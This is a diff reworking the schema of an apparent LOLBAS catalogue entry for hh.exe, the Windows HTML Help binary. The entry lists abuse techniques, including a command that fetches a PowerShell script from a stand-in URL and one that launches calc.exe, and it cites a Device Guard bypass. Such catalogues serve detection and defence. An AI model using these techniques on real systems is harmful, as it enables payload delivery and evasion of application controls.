@@ -1,30 +1,17 @@
 ---
+name: hh.exe
+description: binary used for processing chm files in Windows.
 functions:
+  download:
+    - description: Open the target PowerShell script with HTML Help.
+      code: HH.exe http://some.url/script.ps1
   execute:
-    -
-      Name: hh.exe
-      Description: Download, Execute
-      Author: ''
-      Created: '2018-05-25'
-      Categories: |
-      
-      Commands: |
-          Command: HH.exe http://www.google.com
-          Description: Opens google's web page with HTML Help.
-          Command: HH.exe C:\
-          Description: Opens c:\\ with HTML Help.
-          Command: HH.exe c:\windows\system32\calc.exe
-          Description: 'Opens calc.exe with HTML Help.'
-          Command: HH.exe http://some.url/script.ps1
-          Description: Open the target PowerShell script with HTML Help.
-      Full_Path:
-          c:\windows\system32\hh.exe
-          c:\windows\sysWOW64\hh.exe
-      Code_Sample: |
-          
-      Detection: |
-          
-      Resources: |
-          https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/
-      Notes: Thanks to Oddvar Moe - @oddvarmoe
+    - description: Executes calc.exe with HTML Help.
+      code: HH.exe c:\windows\system32\calc.exe
+resources: 
+    - resource: https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/
+fullpath: 
+    - path: c:\windows\system32\hh.exe
+    - path: c:\windows\sysWOW64\hh.exe
+notes: Thanks to Oddvar Moe - @oddvarmoe
 ---
